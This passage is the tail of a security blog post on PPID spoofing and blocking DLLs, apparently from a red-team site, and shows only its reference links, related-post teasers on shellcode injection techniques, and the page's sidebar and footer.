href="https://pentestlab.blog/2020/02/24/parent-pid-spoofing/">Parent PID Spoofing</a><li><a href="http://secureallofus.blogspot.com/2020/03/covenant-task-101-ppid-spoof-example.html">Covenant Task 101 - PPID Spoof Example</a><li><a href="https://rioasmara.com/2022/04/16/less-detectable-with-ppid-spoofing/">Less Detectable with PPID Spoofing</a><li><a href="https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec">PPID Spoof &amp; BlockDLLs - RastaMouse</a><li><a href="https://github.com/3xpl01tc0d3r/ProcessInjection/blob/master/ProcessInjection/PInvoke/PPIDSpoofing.cs">ProcessInjection - 3xpl01tc0d3r</a><li><a href="https://blog.xpnsec.com/becoming-system/">Alternative methods of becoming SYSTEM - XPN</a><li><a href="https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs">CSharp - leoloobeek</a><li><a href="https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab8/1.cs">Defcon27 CSharp Workshop - mvelazc0</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Staying+Under+the+Radar+-+Part+1+-+PPID+Spoofing+and+Blocking+DLLs+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Staying+Under+the+Radar+-+Part+1+-+PPID+Spoofing+and+Blocking+DLLs+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar-Part-2/"><div class="card-body"> <em class="small" data-ts="1663614000" data-df="ll" > Sep 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 2 - Hiding IAT using Delegates</h3><div class="text-muted small"><p> Introduction In this post we are going to loo kat another technique we can use in C# that can help us keep our imports hidden and the Import Address Table (IAT) clean. This is done by the use of de...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/" class="btn btn-outline-primary" prompt="Older"><p>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</p></a> <a href="/posts/Staying-under-the-Radar-Part-2/" class="btn btn-outline-primary" prompt="Newer"><p>Staying Under the Radar - Part 2 - Hiding IAT using Delegates</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
